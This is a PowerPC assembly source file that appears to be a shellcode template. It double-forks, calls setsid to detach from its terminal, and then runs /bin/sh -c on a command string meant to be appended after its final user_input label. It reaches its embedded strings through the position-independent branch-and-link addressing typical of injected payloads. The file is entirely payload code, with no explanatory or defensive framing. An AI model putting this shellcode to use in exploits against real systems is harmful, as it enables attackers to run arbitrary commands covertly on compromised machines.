#include <sys/syscall.h>

#define BINSH "/bin/sh\x00\x00\x00\x00"
#define TACC "-c\x00\x00\x00\x00\x00"

.globl main
.type main, @function

main:
    li 0, SYS_fork
    sc
    cmpwi 3, 0
    beq setsid
    li 3, 0
    li 0, SYS_exit
    sc

setsid:
    li 0, SYS_setsid
    sc
    li 0, SYS_fork
    sc
    cmpwi 3, 0
    beq forkexit
    li 3, 0
    li 0, SYS_exit
    sc

forkexit:
    b get_binsh

ret1:
    mflr 3
    stw 3, -16(1)
    b get_tacc

ret2:
    mflr 5
    stw 5, -12(1)
    b get_userinput

ret3:
    mflr 5
    stw 5, -8(1)
    li 5, 0
    stw 5, -4(1)

binsh:
    subi 4,1,16
    li 0, SYS_execve
    sc

exit:
    li 3, 0
    li 0, SYS_exit
    sc

get_binsh:
    bl ret1
    .string BINSH

get_tacc:
    bl ret2
    .string TACC

get_userinput:
    bl ret3

user_input:
